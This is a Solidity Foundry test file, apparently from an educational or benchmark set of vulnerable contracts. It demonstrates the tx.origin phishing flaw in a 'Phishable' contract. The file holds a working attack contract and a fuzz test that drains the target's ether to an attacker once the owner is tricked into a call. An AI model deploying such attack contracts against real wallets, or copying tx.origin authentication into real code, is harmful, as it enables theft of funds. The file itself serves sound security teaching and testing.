
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract AttackContract {
    Phishable public target;
    address payable public attacker;

    constructor(Phishable _target, address payable _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function attack() external {
        target.withdrawAll(attacker);
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public phishable;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        phishable = new Phishable(owner);
        vm.deal(address(phishable), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner since they are the only privileged role
        vm.assume(caller != owner);
        
        // Exclude the phishable contract itself
        vm.assume(caller != address(phishable));

        // --- 2. State Configuration ---
        uint256 initialBalance = address(phishable).balance;
        uint256 callerInitialBalance = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // The vulnerability is that tx.origin is used instead of msg.sender
        // An attacker can deploy a malicious contract and trick the owner into calling it
        // The malicious contract then calls withdrawAll, and tx.origin will be the owner
        
        // To demonstrate this, we simulate the owner calling an attacker's contract
        // which in turn calls withdrawAll
        
        AttackContract attackContract = new AttackContract(phishable, payable(caller));
        
        // The owner is tricked into calling the attack contract
        // tx.origin will be owner, but msg.sender will be attackContract
        vm.prank(owner, owner); // Sets both msg.sender and tx.origin to owner
        attackContract.attack();

        // Assert that the funds were drained to the arbitrary caller (attacker)
        assertEq(address(phishable).balance, 0, "Phishable contract should be drained");
        assertEq(caller.balance, callerInitialBalance + initialBalance, "Caller should receive the funds");
    }
}
